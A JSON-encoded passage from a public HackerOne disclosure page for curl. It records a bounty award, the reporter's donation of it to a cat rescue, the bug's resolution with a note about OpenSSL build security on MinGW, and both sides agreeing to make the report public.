default\u003c/li\u003e\n\u003cli\u003eMinGW (and similar) built on Windows: insecure by default\u003c/li\u003e\n\u003cli\u003eMinGW (and similar) cross-built: secure build not possible without\npatching OpenSSL\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2019-06-26T22:39:04.374Z","updated_at":"2019-06-26T22:41:18.703Z","actor":{"username":"vsz","cleared":false,"url":"/vsz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/643/721/fde2d78348b717d0e9e169e1803f95a73bdb21b7_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5209977,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"We've discussed and debated this another around, and the decision is that we will hand out a reward. This revised view is primarily based on two mitigating factors:\n\n1. the policy text is not crystal clear in this regard (our fault) and we will take this opportunity to clarify that for the future, and\n2. the previous publication was done by the same author that reported this to us, this was not a case of \"trawling of public info to extract money\".\n\nThanks a lot for your hard work on helping us making curl a better and more secure product, @mirchr!","markdown_message":"\u003cp\u003eWe\u0026#39;ve discussed and debated this another around, and the decision is that we will hand out a reward. This revised view is primarily based on two mitigating factors:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003ethe policy text is not crystal clear in this regard (our fault) and we will take this opportunity to clarify that for the future, and\u003c/li\u003e\n\u003cli\u003ethe previous publication was done by the same author that reported this to us, this was not a case of \u0026quot;trawling of public info to extract money\u0026quot;.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eThanks a lot for your hard work on helping us making curl a better and more secure product, \u003ca href=\"/mirchr\"\u003e@mirchr\u003c/a\u003e!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-27T21:09:57.257Z","updated_at":"2019-06-27T21:09:57.257Z","actor":{"url":"/curl","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/663/2faf4c279d437d64bfda6d23d62ce1833813a4d9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"curl"}},"bounty_amount":"200.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"curl","collaborator":{"username":"mirchr","url":"/mirchr"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5210256,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you reevaluating the situation and for the bounty. I really appreciate it. Today I donated 100% of this bounty and also matched it to the [New Beginnings Cat Rescue](http://nbcrtx.org/) in Garland, TX where I volunteer. NBCR received a $400 donation! Thanks!","markdown_message":"\u003cp\u003eThank you reevaluating the situation and for the bounty. I really appreciate it. Today I donated 100% of this bounty and also matched it to the \u003ca href=\"/redirect?url=http%3A%2F%2Fnbcrtx.org%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eNew Beginnings Cat Rescue\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e in Garland, TX where I volunteer. NBCR received a $400 donation! Thanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-27T22:30:33.112Z","updated_at":"2019-06-27T22:30:33.112Z","actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5211703,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks everyone for the hard work put into this issue. We can only hope that the OpenSSL project will address this at some point, but for now we've all done what we can.","markdown_message":"\u003cp\u003eThanks everyone for the hard work put into this issue. We can only hope that the OpenSSL project will address this at some point, but for now we\u0026#39;ve all done what we can.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-06-28T07:32:43.786Z","updated_at":"2019-06-28T07:32:43.786Z","actor":{"username":"dgustafsson","cleared":false,"url":"/dgustafsson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"mirchr","url":"/mirchr"},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5217636,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-29T01:48:01.949Z","updated_at":"2019-06-29T01:48:01.949Z","first_to_agree":true,"actor":{"username":"mirchr","cleared":true,"url":"/mirchr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/d5WVwYt8n5pYhhom1mNPokFG/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5221211,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-29T18:24:27.055Z","updated_at":"2019-06-29T18:24:27.055Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5221212,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2019-06-29T18:24:27.132Z","updated_at":"2019-06-29T18:24:27.132Z","actor":{"username":"bagder","cleared":false,"url":"/bagder","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/459/380/963f64725677dda4f5113219588e7d0c1ab9abaa_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"curl","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}